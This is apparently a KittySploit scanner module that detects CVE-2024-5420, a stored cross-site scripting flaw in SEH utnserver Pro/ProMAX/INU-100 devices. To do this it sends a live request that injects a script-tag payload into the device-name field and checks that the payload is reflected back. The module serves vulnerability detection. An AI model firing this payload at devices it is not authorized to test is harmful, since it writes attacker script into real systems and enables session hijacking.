#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""A vulnerability was found in utnserver Pro, utnserver ProMAX, and INU-100 version 20."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'SEH utnserver Pro/ProMAX/INU-100 20.1.22 - Cross-Site Scripting Detection',
        'description': 'A vulnerability was found in utnserver Pro, utnserver ProMAX, and INU-100 version 20.1.22 and earlier, affecting the device description parameter in the web interface. This flaw allows stored cross-site scripting (XSS), enabling attackers to inject JavaScript code. The attack can be executed remotely by tricking victims into visiting a malicious website, potentially leading to session hijacking. This vulnerability is publicly disclosed and identified as CVE-2024-5420.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2024', 'utnserver', 'seh', 'xss', 'seclists', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://cyberdanube.com/en/en-multiple-vulnerabilities-in-seh-untserver-pro/index.html',
            'https://seclists.org/fulldisclosure/2024/Jun/4',
            'https://nvd.nist.gov/vuln/detail/CVE-2024-5420',
            'http://seclists.org/fulldisclosure/2024/Jun/4',
            'https://cyberdanube.com/en/en-multiple-vulnerabilities-in-oring-iap420/index.html',
        ],
        'cve': 'CVE-2024-5420',
    }

    def run(self):
        path = '/device/description_en.html'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded'}, data='action=set&sys_name=%E2%80%9C%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&sys_descr=&sys_contact=\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('value="“><script>alert(document.domain)</script>" id="standort"', 'Host name</label>',)
        header_any = ('text/html',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(severity='high', reason='SEH utnserver Pro/ProMAX/INU-100 20.1.22 - Cross-Site Scripting detected', path=path)
            return True
        return False

